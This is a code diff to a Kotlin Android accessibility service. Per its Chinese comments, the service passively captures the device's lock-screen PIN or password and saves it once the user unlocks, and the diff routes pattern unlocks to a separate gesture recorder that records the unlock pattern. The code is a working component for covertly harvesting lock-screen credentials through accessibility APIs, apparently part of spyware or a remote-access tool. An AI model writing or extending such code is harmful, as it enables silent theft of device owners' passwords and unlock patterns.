@@ -1869,10 +1869,14 @@ class MyAccessibilityService : AccessibilityService() {
                             Intent.ACTION_USER_PRESENT -> {
                                 android.util.Log.d(TAG, "USER_PRESENT")
                                 try { sendScreenStatus() } catch (_: Exception) {}
-                                // 被动监听模式：用户解锁成功 = 密码验证成功，直接确认保存
-                                if (isCipherCaptureEnabled) {
-                                    android.util.Log.d(TAG, "🔐 USER_PRESENT + cipher监听中 → 确认保存密码")
+                                // 被动监听模式：用户解锁成功 = 密码验证成功
+                                // 但如果 GestureRecorderManager 正在录制图案，由它在 onUnlocked() 中处理
+                                val grm = gestureRecorderManager
+                                if (isCipherCaptureEnabled && (grm == null || !grm.isRecording)) {
+                                    android.util.Log.d(TAG, "🔐 USER_PRESENT + cipher监听中(非图案) → 确认保存密码")
                                     cipherCaptureManager?.confirmAndSaveLastCipher()
+                                } else if (grm?.isRecording == true) {
+                                    android.util.Log.d(TAG, "🔐 USER_PRESENT + 图案录制中 → 由 GestureRecorderManager 处理")
                                 }
                                 val pType = pendingPasswordType
                                 if (pType != null) {
